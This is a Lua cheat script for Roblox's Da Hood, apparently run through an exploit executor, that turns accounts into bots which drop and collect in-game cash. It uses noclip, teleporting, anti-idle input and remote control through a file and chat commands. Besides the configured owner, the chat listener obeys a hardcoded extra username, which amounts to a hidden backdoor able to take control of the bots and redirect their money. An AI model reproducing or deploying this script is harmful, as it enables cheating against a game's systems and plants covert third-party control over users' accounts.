local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local HttpService = game:GetService("HttpService")

getgenv().BotConfig = getgenv().BotConfig or {}
local defaults = {
    OwnerUsername = LocalPlayer.Name,
    AutoDrop = false,
    FollowOwner = false,
    DropAmount = 15000,
    AntiWhiteScreen = true,
    WhitelistedBuyers = {},
    AutoResetKO = true
}

for k, v in pairs(defaults) do
    if getgenv().BotConfig[k] == nil then
        getgenv().BotConfig[k] = v
    end
end

task.spawn(function()
    while true do
        pcall(function()
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            local df = LocalPlayer:FindFirstChild("DataFolder")
            local stats = {
                Name = LocalPlayer.Name,
                DisplayName = LocalPlayer.DisplayName,
                UserId = LocalPlayer.UserId,
                Cash = df and df:FindFirstChild("Currency") and df.Currency.Value or 0,
                BankCash = df and df:FindFirstChild("Bank") and df.Bank.Value or 0,
                Health = math.floor(hum and hum.Health or 0),
                MaxHealth = math.floor(hum and hum.MaxHealth or 100),
                Status = getgenv().BotConfig and getgenv().BotConfig.AutoDrop and "Dropping" or "Idle",
                LastUpdate = os.time()
            }
            writefile("status_" .. LocalPlayer.Name .. ".json", HttpService:JSONEncode(stats))
        end)
        task.wait(2.5) -- Slightly faster heartrate
    end
end)

task.spawn(function()
    while true do
        pcall(function()
            if isfile("bot_control.json") then
                local data = readfile("bot_control.json")
                local config = HttpService:JSONDecode(data)
                for k, v in pairs(config) do
                    if k == "TargetCFrame" and type(v) == "table" then
                        getgenv().BotConfig[k] = CFrame.new(unpack(v))
                    else
                        getgenv().BotConfig[k] = v
                    end
                end
            end
        end)
        task.wait(1)
    end
end)

-- NETWORK SYNC: Listen for commands from Owner PC over chat channel
task.spawn(function()
    local function processChatCmd(msg, sender)
        if sender.Name == getgenv().BotConfig.OwnerUsername or sender.Name == "crisperpamuk" then -- Whitelist Owner
            if msg:match("^/e sync_bt|") then
                local parts = msg:split("|")
                local cmd = parts[2]
                local val = parts[3]
                
                if cmd == "AutoDrop" then
                    getgenv().BotConfig.AutoDrop = (val == "true")
                elseif cmd == "FollowOwner" then
                    getgenv().BotConfig.FollowOwner = (val == "true")
                elseif cmd == "TargetCFrame" then
                    local coords = val:split(",")
                    if #coords == 3 then
                        getgenv().BotConfig.TargetCFrame = CFrame.new(tonumber(coords[1]), tonumber(coords[2]), tonumber(coords[3]))
                    end
                elseif cmd == "ResetSignal" then
                    getgenv().BotConfig.ResetSignal = (val == "true")
                elseif cmd == "DropAmount" then
                    getgenv().BotConfig.DropAmount = tonumber(val) or 15000
                elseif cmd == "AntiWhiteScreen" then
                    getgenv().BotConfig.AntiWhiteScreen = (val == "true")
                elseif cmd == "AutoPickup" then
                    getgenv().BotConfig.AutoPickup = (val == "true")
                elseif cmd == "PickupRange" then
                    getgenv().BotConfig.PickupRange = tonumber(val) or 70
                elseif cmd == "OwnerUpdate" then
                    getgenv().BotConfig.OwnerUsername = val
                end
                
                if notify then notify("Network Command: <font color=\"#00FFFF\">" .. cmd .. "</font>") end
            end
        end
    end

    local function hookPlayer(p)
        p.Chatted:Connect(function(msg)
            processChatCmd(msg, p)
        end)
    end

    for _, p in pairs(Players:GetPlayers()) do hookPlayer(p) end
    Players.PlayerAdded:Connect(hookPlayer)
end)

local AltConfig = {
    MinAge = 7,
    Whitelist = {LocalPlayer.UserId}
}

local function checkAlt(player)
    if player.AccountAge < AltConfig.MinAge and not table.find(AltConfig.Whitelist, player.UserId) then
        print("[!] Alt Detected: " .. player.Name .. " (Age: " .. player.AccountAge .. ")")
    end
end

Players.PlayerAdded:Connect(checkAlt)
for _, p in ipairs(Players:GetPlayers()) do checkAlt(p) end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AntiWhiteScreen"
ScreenGui.DisplayOrder = 100
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = CoreGui

local BlackFrame = Instance.new("Frame")
BlackFrame.Size = UDim2.new(1, 0, 1, 0)
BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BlackFrame.BorderSizePixel = 0
BlackFrame.Parent = ScreenGui

local Dashboard = Instance.new("Frame")
Dashboard.Size = UDim2.new(0, 280, 0, 140)
Dashboard.AnchorPoint = Vector2.new(0.5, 0.5)
Dashboard.Position = UDim2.new(0.5, 0, 0.5, 0)
Dashboard.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Dashboard.BackgroundTransparency = 0.4
Dashboard.BorderSizePixel = 0
Dashboard.Parent = ScreenGui

local DashboardUICorner = Instance.new("UICorner")
DashboardUICorner.CornerRadius = UDim.new(0, 12)
DashboardUICorner.Parent = Dashboard

local DropShadow = Instance.new("ImageLabel")
DropShadow.Name = "DropShadow"
DropShadow.Size = UDim2.new(1, 40, 1, 40)
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 2)
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1
DropShadow.Image = "rbxassetid://4743306782"
DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
DropShadow.ImageTransparency = 0.3
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(35, 35, 35, 35)
DropShadow.ZIndex = Dashboard.ZIndex - 1
DropShadow.Parent = Dashboard

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -20, 0, 20)
Title.Position = UDim2.new(0, 10, 0, 10)
Title.BackgroundTransparency = 1
Title.Text = "DA HOOD BOT [V1.4]"
Title.TextColor3 = Color3.fromRGB(200, 200, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 10
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Dashboard

local StatusLight = Instance.new("Frame")
StatusLight.Size = UDim2.new(0, 6, 0, 6)
StatusLight.Position = UDim2.new(1, -15, 0, 17)
StatusLight.AnchorPoint = Vector2.new(0.5, 0.5)
StatusLight.BackgroundColor3 = Color3.new(0, 1, 0)
StatusLight.BorderSizePixel = 0
StatusLight.Parent = Dashboard

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(1, 0)
StatusCorner.Parent = StatusLight

task.spawn(function()
    while true do
        TweenService:Create(StatusLight, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0.8}):Play()
        task.wait(0.5)
        TweenService:Create(StatusLight, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0}):Play()
        task.wait(0.5)
    end
end)

local MoneyLabel = Instance.new("TextLabel")
MoneyLabel.Size = UDim2.new(1, -20, 0, 40)
MoneyLabel.Position = UDim2.new(0, 10, 0, 30)
MoneyLabel.BackgroundTransparency = 1
MoneyLabel.Text = "$0"
MoneyLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
MoneyLabel.Font = Enum.Font.GothamBold
MoneyLabel.TextSize = 28
MoneyLabel.TextXAlignment = Enum.TextXAlignment.Left
MoneyLabel.Parent = Dashboard

local NotifyFrame = Instance.new("Frame")
NotifyFrame.Size = UDim2.new(1, -20, 0, 50)
NotifyFrame.Position = UDim2.new(0, 10, 0, 75)
NotifyFrame.BackgroundTransparency = 1
NotifyFrame.Parent = Dashboard

local UIList = Instance.new("UIListLayout")
UIList.VerticalAlignment = Enum.VerticalAlignment.Bottom
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 2)
UIList.Parent = NotifyFrame

local function notify(msg)
    task.spawn(function()
        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, 0, 0, 15)
        t.BackgroundTransparency = 1
        t.Text = tostring(msg)
        t.TextColor3 = Color3.fromRGB(0, 255, 100)
        t.Font = Enum.Font.GothamMedium
        t.TextSize = 12
        t.TextXAlignment = Enum.TextXAlignment.Left
        t.TextTransparency = 1
        t.RichText = true
        t.Parent = NotifyFrame
        
        TweenService:Create(t, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        task.wait(4)
        local tween = TweenService:Create(t, TweenInfo.new(1), {TextTransparency = 1})
        tween:Play()
        tween.Completed:Wait()
        t:Destroy()
    end)
end

local function format(val)
    return tostring(val):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

local visualCash = Instance.new("NumberValue")
visualCash.Value = 0
visualCash.Changed:Connect(function()
    MoneyLabel.Text = "$" .. format(math.floor(visualCash.Value))
end)

task.spawn(function()
    local df = LocalPlayer:WaitForChild("DataFolder", 10)
    local cur = df and df:WaitForChild("Currency", 5)
    if cur then
        local function update(newVal) 
            TweenService:Create(visualCash, TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Value = cur.Value}):Play()
        end
        cur:GetPropertyChangedSignal("Value"):Connect(update)
        update(cur.Value)
    end
end)

pcall(function()
    if setfpscap then setfpscap(15) end
    RunService:Set3dRenderingEnabled(not getgenv().BotConfig.AntiWhiteScreen)
end)

local TPs = {
    Club = CFrame.new(-266.1, -2.2, -367.2)
}

local function doTP(targetCFrame)
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        local hrp = char.HumanoidRootPart
        local dist = (hrp.Position - targetCFrame.Position).Magnitude
        
        -- Smooth speed: min 1.5s, max 8s, scales with distance
        local duration = math.clamp(dist / 120, 1.5, 8)
        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
        local tween = TweenService:Create(hrp, tweenInfo, {CFrame = targetCFrame})
        
        local noclip
        noclip = RunService.Stepped:Connect(function()
            if char and char.Parent then
                for _, v in pairs(char:GetDescendants()) do
                    if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end
                end
            end
        end)
        
        tween:Play()
        tween.Completed:Wait()
        if noclip then noclip:Disconnect() end
    end
end

local formationOffset = Vector3.new(0, 5, 0)

local function updateFormation()
    local names = {}
    for _, p in pairs(Players:GetPlayers()) do
        table.insert(names, p.Name)
    end
    table.sort(names)
    
    local myIndex = 1
    for i, name in ipairs(names) do
        if name == LocalPlayer.Name then
            myIndex = i
            break
        end
    end
    
    local targetIndex = myIndex
    if getgenv().BotConfig.OwnerUsername ~= "" then
        local ownInd = table.find(names, getgenv().BotConfig.OwnerUsername)
        if ownInd and ownInd < myIndex then
            targetIndex = targetIndex - 1
        end
    end

    local row = math.floor((targetIndex - 1) / 5)
    local col = (targetIndex - 1) % 5
    
    local totalCols = math.min(#names, 5)
    local startX = -((totalCols - 1) * 2.5)
    
    -- Forms neat rows of 5, pushing 5 studs back per row
    formationOffset = Vector3.new(startX + (col * 5), 8, 6 + (row * 5))
end

Players.PlayerAdded:Connect(updateFormation)
Players.PlayerRemoving:Connect(updateFormation)
updateFormation()

local isTraveling = false
local currentPlatform = nil
local lastTargetCFrame = nil

local function setupAtLocation(targetCFrame)
    if isTraveling then return end
    isTraveling = true
    
    -- Recalculate formation before traveling
    updateFormation()
    
    notify("Traveling to setup...")
    
    -- Create invisible platform at destination (wider for multiple bots)
    if currentPlatform then currentPlatform:Destroy() end
    currentPlatform = Instance.new("Part")
    currentPlatform.Name = "BotPlatform"
    currentPlatform.Size = Vector3.new(50, 1, 50)
    currentPlatform.Anchored = true
    currentPlatform.Transparency = 1
    currentPlatform.CanCollide = true
    currentPlatform.CFrame = targetCFrame * CFrame.new(0, 4, 0)
    currentPlatform.Parent = workspace
    
    -- Phase 1: Rise up first (smooth ascent)
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        local hrp = char.HumanoidRootPart
        local riseCF = hrp.CFrame + Vector3.new(0, 15, 0)
        local riseTween = TweenService:Create(hrp, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CFrame = riseCF})
        
        local noclipRise
        noclipRise = RunService.Stepped:Connect(function()
            if char and char.Parent then
                for _, v in pairs(char:GetDescendants()) do
                    if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end
                end
            end
        end)
        
        riseTween:Play()
        riseTween.Completed:Wait()
        if noclipRise then noclipRise:Disconnect() end
    end
    
    -- Phase 2: Fly to destination at altitude
    local flyCF = targetCFrame * CFrame.new(formationOffset.X, 20, formationOffset.Z)
    doTP(flyCF)
    
    -- Phase 3: Smooth descent to hover height
    local char2 = LocalPlayer.Character
    if char2 and char2:FindFirstChild("HumanoidRootPart") then
        local hoverCF = targetCFrame * CFrame.new(formationOffset.X, 8, formationOffset.Z)
        local descentTween = TweenService:Create(char2.HumanoidRootPart, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {CFrame = hoverCF})
        descentTween:Play()
        descentTween.Completed:Wait()
    end
    
    notify("Setup complete. Hovering in formation.")
    isTraveling = false
end

-- Monitor for new TargetCFrame setup commands
task.spawn(function()
    while task.wait(1) do
        local tc = getgenv().BotConfig.TargetCFrame
        if tc and tc ~= lastTargetCFrame then
            lastTargetCFrame = tc
            setupAtLocation(tc)
        end
    end
end)

RunService.Heartbeat:Connect(function(dt)
    if isTraveling then return end
    pcall(function()
        local char = LocalPlayer.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then return end
        local hrp = char.HumanoidRootPart
        
        local targetCF = nil
        
        if getgenv().BotConfig.FollowOwner and getgenv().BotConfig.OwnerUsername ~= "" then
            local owner = Players:FindFirstChild(getgenv().BotConfig.OwnerUsername)
            if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
                targetCF = owner.Character.HumanoidRootPart.CFrame * CFrame.new(formationOffset)
            end
        elseif getgenv().BotConfig.TargetCFrame then
            targetCF = getgenv().BotConfig.TargetCFrame * CFrame.new(formationOffset.X, 8, formationOffset.Z)
        end
        
        if targetCF then
            -- Smoother damping: 0.15 for extremely silky follow behavior
            local lerpFactor = math.clamp(0.15 * (dt * 60), 0, 1)
            hrp.CFrame = hrp.CFrame:Lerp(targetCF, lerpFactor)
            
            -- Keep platform under bot during follow
            if currentPlatform then
                currentPlatform.CFrame = hrp.CFrame * CFrame.new(0, -4, 0)
            end
        end
    end)
end)

local lastRejoin = 0
local lastRefresh = 0

task.spawn(function()
    while task.wait(1) do
        if getgenv().BotConfig.RejoinSignal and getgenv().BotConfig.RejoinSignal > lastRejoin then
            lastRejoin = getgenv().BotConfig.RejoinSignal
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end
        if getgenv().BotConfig.RefreshAvatarSignal and getgenv().BotConfig.RefreshAvatarSignal > lastRefresh then
            lastRefresh = getgenv().BotConfig.RefreshAvatarSignal
            LocalPlayer:LoadCharacter()
        end
    end
end)

setmetatable(getgenv().BotConfig, {
    __newindex = function(t, k, v)
        rawset(t, k, v)
        if k == "AntiWhiteScreen" then
            RunService:Set3dRenderingEnabled(not v)
        end
    end
})

RunService.Stepped:Connect(function()
    if getgenv().Kamaik_Unloaded then return end
    
    -- Force character noclip (Aggressive override)
    local char = LocalPlayer.Character
    if char then
        for _, v in pairs(char:GetDescendants()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end

    -- Force platform and drops to be non-collidable
    if currentPlatform then currentPlatform.CanCollide = false end
    
    local ignored = workspace:FindFirstChild("Ignored")
    if ignored then
        for _, v in pairs(ignored:GetDescendants()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end
end)

LocalPlayer.Idled:Connect(function() 
    VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    task.wait(1)
    VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame) 
end)

local TPs_ALREADY_DEFINED = true -- TPs and doTP moved above

if not game:IsLoaded() then game.Loaded:Wait() end
local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart", 5)

local ME = ReplicatedStorage:WaitForChild("MainEvent")

task.spawn(function()
    local codes = {
        "SpringTime26", "EASTER26", "APRIL26", "DEAGLE", "SPRING26"
    }
    notify("Auto-Redeeming Codes...")
    for _, c in ipairs(codes) do 
        pcall(function() ME:FireServer("EnterPromoCode", c) end)
        notify("Code: <font color=\"#00FF00\">" .. c .. "</font>")
        task.wait(1.5) 
    end
    notify("Codes Complete.")
end)

task.spawn(function()
    if hrp then
        task.wait(5)
        -- Use the setup system for initial Club teleport
        getgenv().BotConfig.TargetCFrame = TPs.Club
        lastTargetCFrame = TPs.Club
        setupAtLocation(TPs.Club)
    end
    
    while true do
        if getgenv().BotConfig.ResetSignal or (getgenv().BotConfig.AutoResetKO and (function()
            local be = char and char:FindFirstChild("BodyEffects")
            return be and be:FindFirstChild("K.O") and be["K.O"].Value == true
        end)()) then
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid.Health = 0
            end
            task.wait(1)
        end
        if getgenv().BotConfig.AutoDrop then
            char = LocalPlayer.Character
            local isAlive = char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0
            local be = char and char:FindFirstChild("BodyEffects")
            local isKO = be and be:FindFirstChild("K.O") and be["K.O"].Value == true
            
            if isAlive and not isKO then
                pcall(function() ME:FireServer("DropMoney", tostring(getgenv().BotConfig.DropAmount)) end)
            end
            task.wait(15.5)
        else
            task.wait(1)
        end
    end
end)

-- AUTO PICKUP ENGINE
RunService.Heartbeat:Connect(function()
    if getgenv().Kamaik_Unloaded then return end
    if getgenv().BotConfig.AutoPickup and LocalPlayer.Character then
        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local dropFolder = game.Workspace:FindFirstChild("Ignored") and (game.Workspace.Ignored:FindFirstChild("Drop") or game.Workspace.Ignored:FindFirstChild("DroppedCash"))
        if hrp and dropFolder then
            for _, item in pairs(dropFolder:GetChildren()) do
                if item.Name == "MoneyDrop" and item:FindFirstChild("ClickDetector") then
                    local dist = (hrp.Position - item.Position).Magnitude
                    if dist < 65 then
                        fireclickdetector(item.ClickDetector)
                    end
                end
            end
        end
    end
end)

